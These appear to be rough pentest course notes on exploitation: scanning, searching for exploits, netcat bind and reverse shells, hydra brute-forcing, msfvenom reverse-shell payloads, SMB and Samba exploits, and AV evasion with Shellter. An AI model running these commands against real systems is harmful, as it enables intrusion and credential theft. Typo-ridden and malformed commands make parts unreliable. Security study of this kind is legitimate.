# Intro to Exploitation 
+ Exploitation consit of techniues and tools used to gain a foothgold on a target system
+ Succseful will heavcenly depend on the nature of the quailtiy
+ We still nwws a clearer picture of the exploitation methodlogy and the tolls and techiques involved in the process
+ PTES - methododly standard for pentest
+ Informationm Gathering , Numenration , Exploitation
+ Identif vulenrable services , identify and prepare exploit code
+ gain acess
+ obtain remote access o ntarget system
+ bypass av detection
+ pivot on the other system

# Vulenrability Scanning Overview 
+ Information Gathering and getting OS info and services info
```
nmap -sV -O IP

ls -al /usr/share/nmap/scripts/ | grep banner

nmap -sV --scipt=banner IP

whatis nc

nc IP

searchsploit service 

```

## Vulenrability Scanning with NMAP Script

```
nmap -sV --script=http-enum IP
ls -al /usr/share/nmap/scripts/ | grep name_of_file

nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" IP

```

## Vulnerability Scanning with Metasploit 
```
nmap -sS -sV IP
msfconsole auxiliary/scanner/smb/smb_ms17_010

```
## Search for Publicly Available Exploits 
+ Best sources Exploit-db and Rapid7
+ Exploit DB
+ name_exploit site:exploit-db.com
+ name_exploit site:rapid7.com

## Searching with Exploits with Searchsploits 
```
searchsploit -u
searchsploit servicename
searchsploit servicename serivcenumber
searchsploit -m ID
searchsploit -c servicename #case sensitive
searchsploit -t vsftpd # checks in the title
searchsploit -e "Exact Matches" # checks for the exact title
searchsploit remote windows smb
searchsploit webapps wordpress

searchsploit -w services to show url
```

## Fixing Exploits 
able to find exploit code on your own 
not always trust on metasploit 
```
nmap -sV IP_ADDRESS

```

## Cross Compile 

+ MinGW-w64
+ GCC
+ i686-w64-mingw32-gcc file.c -o exploit
+ i686-w64-mingw32-gcc file.c -o exploit -lws2_32

## Netcat fundamentals 
+ use to read and write data on TCP or UDP
+ Avaialbnle both nix and windows
+ Cleient Moide and then server mode 
```
nc -nv IP PORT
certuil -urlcache -f http://IP/file_name
nc.exe -nlvp PORT > test.txt sending 
nc -nv IP PORT < test.txt file where have 
```
## Bind Shells
+ a bind shell is a type of remote shell where the attacker connects directly to a listenr on a target system.
+ /usr/share/windows-binaries/
+ nc.exe -nlvp PORT -e cmd.exe windows machine
+ nc -nv IP PORT

## Reverse Shells 
+ reverse shell is a type of remote shell where the target connect directly to a listener on the attackers systemn allowinf for execution of commands on the target system

## Reverse Shell Cheat Sheet 
+ Payload of all things Reverse Shellcheat sheet
+ revshells.com

## Metasploit Framework
+ Penetration testing framework
+ Used to automated exploitation phase
+ interface method interacting with metasploit
+ module code that performs a task
+ vulernabiltiy is a weakness
+ exploit code or mopdule used to take adavtage of a vulenrability
+ payload piece of code dleivelriy to remote target to run command or to get remote acess
+ listenting to listen for an incoming conenction
+ information vulenrability auxiliary
+ exploitation - explpoit modules payloads
+ post explitation pivilege post exploitations

## Powershell Empire 
+ Pure Powershell exploitation and post exploitation
+ Powershell empire received an update and is now offically supported by kali user
+ keyloggers to mimikatz

+ Starkiller gui frontend for the powershell empire
+ both availbnle for kali linux

## Windows Black Box Penetration Test 
+ Not provide with IP or system ifnormation
+ External no isndie knwoeldge
+ Host Dsicvoery, Port Scanning, Vulenrabiltiy, exploitation Post Exploitation
## Port Scanning and Enumeration  Windows
+ DEMO IP from /etc/hosts
+ start with nmap
+ ```
  nmap -T4 -PA -sC -p 1-1000 IP
  ```
+ Figure out and check out all the ports

## Targeting Microsoft IIS FTP
```
ls -al /usr/share/nmap/scripts/ | grep ftp-
nmap -sV -p 21 --script=ftp-anon IP

hydra -L /usr/share/wordlist/metasploit/unix_user.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ftp
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ftp
msfvenom -p /windows/shell/reverse_tcp LHOST=IP LPORT=1234 -f asp > shell.aspx

msfvenom /use/multi/handler


```

## Target Openssh 
```
hydra -L /usr/share/wordlist/metasploit/unix_user.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ssh
hydra -L administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ssh


```

  
## Target SMB
```
nmap -sV -sC -p 445 IP
hydra -L administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt IP smb
smbclient -L IP -U username
smbmap -u username -p password -H IP
enum4linux -u username -p password -U IP

msfconsole smb_enumusers #list username
python3 psexec.py username@IP
msfconsole psexec # payload x64 meterpreter reverse_tcp

eternal blue
```

## Targeting MYSQL Database Server 
```
nmap -sV -sC -p 3306,8585 IP

searchsploit mysql version

msconsole mysql_login unix_password.txt

mysql -u root -p -h IP 
net stop wampapache
net start wampapache
```

## Linux Port Scanning 

```
nmap -sV -p1-1000 IP -oN nmap_10k.txt
nc -nv IP PORT

```

## Targeting VSFPTD

```
ftp IP 21

msfconsole smtp_enum

hydra -l services -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ftp


/usr/share/webshells/php/php-reverse-shell.php
da directory 


```

## Targeting PHP 
```
nmap -sV -sC -p 80 IP
check it otu phpinfo.php
lower 5.3.12 for command execution
searchsploit -m 18836
# add a php reverse shell if 3 dont work add 4 
cgi_exploit

show options 


```


## Targeting SAMBA
```
scanner smb_version

searchsploit samba 3.0.20
CTRL-Z background

session -u 1
sessions num
```
## AV Evasion with Shelter 
+ signature unique sequence of byres that uniques idneitfy malware modify the malwares bytes
+ Heuristic- ruels or decision to detrermine wheter a binary is malciosue looks for a spefici pattr within the code or program calls 
+ behavior relisitny on dientify mawlare by monitoring its behavior
+ On disk evasion - obfuscation reogrnaize code, encode to encdoe to a nw format, packing generate executable with new bianry strucuter, cypters encrypt code or payloads decrypt code in memeory
+ in mmemmroy- payloads is injected into a process

+ 
  
```
sudo apt-get install shellter -y
install wine
sudo wine shellter.exe
vncviewer.exe noirmal exe 
```



## Obfuscating Powershell Code






















